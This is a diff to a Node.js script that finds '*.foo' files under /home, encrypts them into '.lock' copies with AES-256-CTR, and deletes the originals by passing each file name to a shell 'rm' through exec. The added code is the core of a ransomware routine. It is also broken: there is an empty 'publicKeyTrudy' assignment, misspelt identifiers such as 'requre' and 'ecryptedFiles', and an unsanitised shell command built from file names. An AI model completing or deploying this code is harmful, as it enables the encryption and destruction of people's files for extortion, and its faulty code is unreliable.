@@ -1,12 +1,15 @@
 var fileFinder = require('fs-finder');
 var secureRandom = require('secure-random-string');
+var fileStream = require('fs');
+var publicKeyTrudy = ;
 
 var crypto = require('crypto'),
     algorithm = 'aes-256-ctr',
-    password = 'd6F3Efeq';
+    password = secureRandom(64);
+console.log(password);
 
-var files = fileFinder.from('/home').findFiles('*.foo');	
-
+var files = fileFinder.from('/home').findFiles('*.foo');
+var encryptedFiles = [];
 
 function encrypt(text){
   var cipher = crypto.createCipher(algorithm,password)
@@ -22,12 +25,35 @@ function decrypt(text){
   return dec;
 }
 
+function encryptFiles(files){
+	files.forEach(function(file) {
+         var cipher = crypto.createCipher(algorithm,password);
+	 var input = fileStream.createReadStream(file);
+	 var output = fileStream.createWriteStream(file +'lock');
+	 input.pipe(cipher).pipe(output);
+	 ecryptedFiles.push(file +'.lock');
+	});
+}
+
+function deCryptFiles(files){
+	files.forEach(function(file) {
+         var deCipher = crypto.createDecipher(algorithm,password);
+	 var input = fileStream.createReadStream(file);
+	 var output = fileStream.createWriteStream(file.slice(0, -5));
+	 input.pipe(deCipher).pipe(output);
+	});
+}
+
+function deleteOriginalFiles(files) {
+  var sys = require('sys');
+  var exe = requre('child-process').exec;
+  files.forEach(function(file) {
+	exec("rm " + file);
+ });
+}
+
 var hw = "Hello World";
 
 //console.log(currentPath);
 
 console.log(files);
-
-console.log(decrypt(encrypt(hw)));
-
-console.log(secureRandom(64));
